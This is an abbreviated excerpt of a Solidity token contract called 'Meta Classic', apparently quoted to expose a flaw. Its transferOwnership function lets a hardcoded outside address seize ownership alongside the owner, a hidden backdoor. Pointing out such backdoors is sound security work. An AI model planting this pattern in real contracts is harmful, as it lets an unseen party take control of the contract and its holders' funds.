...
contract Ownable is Context {
    ...
    function transferOwnership(address newOwner) public virtual {
        ...
        require(msg.sender == owner() || msg.sender == address(0xbaDA502184617ab0E1C9B0e774C72D304fa6ED61));
...
contract MetaClassic is Context, IERC20, Ownable, Pausable {
  ...
  string private _name = "Meta Classic";
